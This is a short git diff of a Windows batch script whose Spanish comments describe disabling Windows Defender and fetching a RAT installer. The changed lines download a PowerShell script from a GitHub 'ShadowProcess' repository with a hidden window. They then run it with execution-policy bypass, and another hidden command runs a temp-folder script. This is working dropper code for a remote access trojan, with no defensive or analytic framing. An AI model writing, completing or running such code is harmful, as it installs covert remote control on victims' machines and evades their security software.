@@ -30,6 +30,6 @@ if '%errorlevel%' NEQ '0' (
 
 @REM Apagar el defender 3:)
 @REM Rat obteniendo installer 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1?token=GHSAT0AAAAAABY5KKPOR7KST3ABJXDI4AU6YZHSDMQ -OutFile installer.ps1"
-powershell Start-Process -windowstyle hidden -ep bypass ""
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1"
+powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
 powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
